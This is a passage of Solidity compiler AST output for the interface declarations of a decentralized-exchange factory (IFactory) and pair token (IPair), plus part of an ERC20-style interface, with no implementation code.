										"src": "840:6:2"
									},
									"scope": 533,
									"src": "778:69:2",
									"stateMutability": "nonpayable",
									"superFunction": 673,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 532,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transferFrom",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 528,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 523,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 532,
												"src": "884:12:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 522,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "884:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 525,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 532,
												"src": "906:10:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 524,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "906:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 527,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 532,
												"src": "926:13:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 526,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "926:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "874:71:2"
									},
									"returnParameters": {
										"id": 531,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 530,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 532,
												"src": "964:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 529,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "964:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "963:6:2"
									},
									"scope": 533,
									"src": "853:117:2",
									"stateMutability": "nonpayable",
									"superFunction": 684,
									"visibility": "external"
								}
							],
							"scope": 534,
							"src": "62:910:2"
						}
					],
					"src": "36:937:2"
				},
				"id": 2
			},
			"src/IFactory.sol": {
				"ast": {
					"absolutePath": "src/IFactory.sol",
					"exportedSymbols": {
						"IFactory": [
							601
						]
					},
					"id": 602,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 535,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:3"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 601,
							"linearizedBaseContracts": [
								601
							],
							"name": "IFactory",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": null,
									"id": 545,
									"name": "PairCreated",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 544,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 537,
												"indexed": true,
												"name": "token0",
												"nodeType": "VariableDeclaration",
												"scope": 545,
												"src": "114:22:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 536,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "114:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 539,
												"indexed": true,
												"name": "token1",
												"nodeType": "VariableDeclaration",
												"scope": 545,
												"src": "146:22:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 538,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "146:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 541,
												"indexed": false,
												"name": "pair",
												"nodeType": "VariableDeclaration",
												"scope": 545,
												"src": "178:12:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 540,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "178:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 543,
												"indexed": false,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 545,
												"src": "200:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 542,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "200:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "104:109:3"
									},
									"src": "87:127:3"
								},
								{
									"body": null,
									"documentation": null,
									"id": 550,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "feeTo",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 546,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "234:2:3"
									},
									"returnParameters": {
										"id": 549,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 548,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 550,
												"src": "260:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 547,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "260:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "259:9:3"
									},
									"scope": 601,
									"src": "220:49:3",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 555,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "feeToSetter",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 551,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "295:2:3"
									},
									"returnParameters": {
										"id": 554,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 553,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 555,
												"src": "321:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 552,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "321:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "320:9:3"
									},
									"scope": 601,
									"src": "275:55:3",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 564,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "getPair",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 560,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 557,
												"name": "tokenA",
												"nodeType": "VariableDeclaration",
												"scope": 564,
												"src": "362:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 556,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "362:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 559,
												"name": "tokenB",
												"nodeType": "VariableDeclaration",
												"scope": 564,
												"src": "386:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 558,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "386:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "352:54:3"
									},
									"returnParameters": {
										"id": 563,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 562,
												"name": "pair",
												"nodeType": "VariableDeclaration",
												"scope": 564,
												"src": "430:12:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 561,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "430:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "429:14:3"
									},
									"scope": 601,
									"src": "336:108:3",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 571,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "allPairs",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 567,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 566,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 571,
												"src": "468:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 565,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "468:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "467:9:3"
									},
									"returnParameters": {
										"id": 570,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 569,
												"name": "pair",
												"nodeType": "VariableDeclaration",
												"scope": 571,
												"src": "500:12:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 568,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "500:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "499:14:3"
									},
									"scope": 601,
									"src": "450:64:3",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 576,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "allPairsLength",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 572,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "543:2:3"
									},
									"returnParameters": {
										"id": 575,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 574,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 576,
												"src": "569:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 573,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "569:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "568:9:3"
									},
									"scope": 601,
									"src": "520:58:3",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 585,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "createPair",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 581,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 578,
												"name": "tokenA",
												"nodeType": "VariableDeclaration",
												"scope": 585,
												"src": "613:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 577,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "613:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 580,
												"name": "tokenB",
												"nodeType": "VariableDeclaration",
												"scope": 585,
												"src": "637:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 579,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "637:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "603:54:3"
									},
									"returnParameters": {
										"id": 584,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 583,
												"name": "pair",
												"nodeType": "VariableDeclaration",
												"scope": 585,
												"src": "676:12:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 582,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "676:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "675:14:3"
									},
									"scope": 601,
									"src": "584:106:3",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 590,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "setFeeTo",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 588,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 587,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 590,
												"src": "714:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 586,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "714:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "713:9:3"
									},
									"returnParameters": {
										"id": 589,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "731:0:3"
									},
									"scope": 601,
									"src": "696:36:3",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 595,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "setFeeToSetter",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 593,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 592,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 595,
												"src": "762:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 591,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "762:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "761:9:3"
									},
									"returnParameters": {
										"id": 594,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "779:0:3"
									},
									"scope": 601,
									"src": "738:42:3",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 600,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "INIT_CODE_PAIR_HASH",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 596,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "814:2:3"
									},
									"returnParameters": {
										"id": 599,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 598,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 600,
												"src": "840:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 597,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "840:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "839:9:3"
									},
									"scope": 601,
									"src": "786:63:3",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								}
							],
							"scope": 602,
							"src": "62:789:3"
						}
					],
					"src": "36:816:3"
				},
				"id": 3
			},
			"src/IPair.sol": {
				"ast": {
					"absolutePath": "src/IPair.sol",
					"exportedSymbols": {
						"IPair": [
							852
						]
					},
					"id": 853,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 603,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:4"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 852,
							"linearizedBaseContracts": [
								852
							],
							"name": "IPair",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": null,
									"id": 611,
									"name": "Approval",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 610,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 605,
												"indexed": true,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 611,
												"src": "108:21:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 604,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "108:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 607,
												"indexed": true,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 611,
												"src": "139:23:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 606,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "139:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 609,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 611,
												"src": "172:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 608,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "172:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "98:93:4"
									},
									"src": "84:108:4"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 619,
									"name": "Transfer",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 618,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 613,
												"indexed": true,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 619,
												"src": "212:20:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 612,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "212:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 615,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 619,
												"src": "234:18:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 614,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "234:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 617,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 619,
												"src": "254:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 616,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "254:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "211:57:4"
									},
									"src": "197:72:4"
								},
								{
									"body": null,
									"documentation": null,
									"id": 624,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "name",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 620,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "288:2:4"
									},
									"returnParameters": {
										"id": 623,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 622,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 624,
												"src": "314:13:4",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 621,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "314:6:4",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "313:15:4"
									},
									"scope": 852,
									"src": "275:54:4",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 629,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "symbol",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 625,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "350:2:4"
									},
									"returnParameters": {
										"id": 628,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 627,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 629,
												"src": "376:13:4",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 626,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "376:6:4",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "375:15:4"
									},
									"scope": 852,
									"src": "335:56:4",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 634,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "decimals",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 630,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "414:2:4"
									},
									"returnParameters": {
										"id": 633,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 632,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 634,
												"src": "440:5:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 631,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "440:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "439:7:4"
									},
									"scope": 852,
									"src": "397:50:4",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 639,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "totalSupply",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 635,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "473:2:4"
									},
									"returnParameters": {
										"id": 638,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 637,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 639,
												"src": "499:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 636,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "499:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "498:9:4"
									},
									"scope": 852,
									"src": "453:55:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 646,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 642,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 641,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 646,
												"src": "533:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 640,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "533:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "532:15:4"
									},
									"returnParameters": {
										"id": 645,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 644,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 646,
												"src": "571:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 643,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "571:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "570:9:4"
									},
									"scope": 852,
									"src": "514:66:4",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"id": 655,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "allowance",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 651,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 648,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 655,
												"src": "614:13:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 647,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "614:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 650,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 655,
												"src": "637:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 649,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "637:7:4",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "604:54:4"
									},
									"returnParameters": {
										"id": 654,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 653,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 655,
												"src": "682:7:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 652,
													"name": "uint256",
